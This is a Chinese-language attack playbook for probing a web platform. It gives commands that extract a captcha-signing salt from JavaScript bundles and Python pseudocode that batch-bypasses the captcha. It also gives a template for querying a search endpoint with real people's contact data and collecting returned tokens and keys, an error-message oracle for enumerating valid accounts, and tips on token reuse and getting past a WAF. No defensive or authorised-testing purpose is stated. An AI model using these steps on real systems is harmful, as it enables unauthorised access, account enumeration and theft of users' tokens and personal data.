# 闸门探测配方

## 1 从 chunk 里把签名构造挖出来

```bash
# 资源多为 gzip，必须 --compressed，否则 0 命中
curl -s --compressed -o /tmp/bundle.js https://<站>/package/<app>/assets/index.<hash>.js

# 1) 常量盐往往就在签名函数边上
grep -o -E '.{60}(sign|Sign)[^;]{0,120}' /tmp/bundle.js | head -40
grep -rn 'JING\|salt\|Salt\|secret' /tmp/bundle.js | head

# 2) 找端点名（宽松正则奇效，紧匹配容易因转义失败）
grep -o -E '.{20}captcha(Start|Check).{60}' /tmp/bundle.js | head -20
```

要点：
- **同一站的多套前端（买家/商户/管理）各自打包一份**，签名实现可能不同 —— 两边都 grep，再用一次真提交定收。
- 拿到 `sign` 表达式后用「代码算 + 真提交」双验证，**不要手算**。

## 2 闭环一次打通（伪代码）

```python
s = requests.Session()                     # 取图与提交必须同会话
st = s.post(START, json={"code": ""}).json()["data"]     # img_url / check_url / ip
img = s.get(st["img_url"]).content         # 落盘 capN.png → 放大 → 读码
sign = md5(md5(f"{code}{st['ip']}".encode()).hexdigest() + SALT).hexdigest()
tk = s.post(st["check_url"], json={"code": code, "sign": sign}).json()["data"]["ticket"]
r = s.post(BIZ, json={**params, "ticket": tk})            # 票一次性
```

批量：外层再套一层「每张一个独立 `Session`」，先把 N 张图全部拉到本地，再拼联系表一次读全，最后逐张换票打业务。

## 3 四组对照实测记录模板

| 输入 | 返回 | 结论 |
|------|------|------|
| `keywords: ""` | `请输入查询信息` | 必填参数 |
| `keywords: "%"` / `"_"` / `"a"` | `total:0` | 无 LIKE、无通配 |
| `keywords: "<本地已有数据里的真实 contact>"` | `total:4` + 完整对象 | 精确匹配该字段，语义确认 |
| `keywords: "<商品名片段>"` / `"<ID前缀>"` | `total:0` | 排除「其实匹配商品名/ID」 |

记录时同时抄下返回对象的**全部键**（特别是 `user.token` / `id` / `*_key`），下一阶段靠它们。

## 4 oracle 消息判别表

用**错误凭证**打校验类端点，按回包区分存在性（全程零写入）：

| 回包 | 含义 |
|------|------|
| `对象不存在` | 该取值无效 → 候选可丢弃 |
| `凭证不正确` / `验证码不正确` | **该取值有效**（已过存在性关） → 收进有效集 |
| `请先登录` / `token 失效` | 端点有鉴权，不是 oracle |
| `请输入…` | 参数缺失，补参数重测 |

批量枚举时：候选来源优先用**已从其他接口拿到的真实值**（店铺标识、联系方式、ID），命中率远高于字典。

## 5 卡点 → 转场

| 卡点 | 真相 | 转场 |
|------|------|------|
| 返回 `method not exist: <ORM>->part` | 分表/分页功能本身杯了 | 别再试该端点 |
| 拿 A 端 token 去当 B 端认证头 → `失效` | 两套会话体系 | 找 B 端自己的登录/下发面；顺手把 B 端校验端点留作 token oracle |
| 精确匹配不可枚举字段 | 无枚举轴 | 转 token / 管理端面 |
| 敏感路径从 403 变 404 | WAF 被穿过，已到源站 | 404 才是真实结果，按 404 推进 |
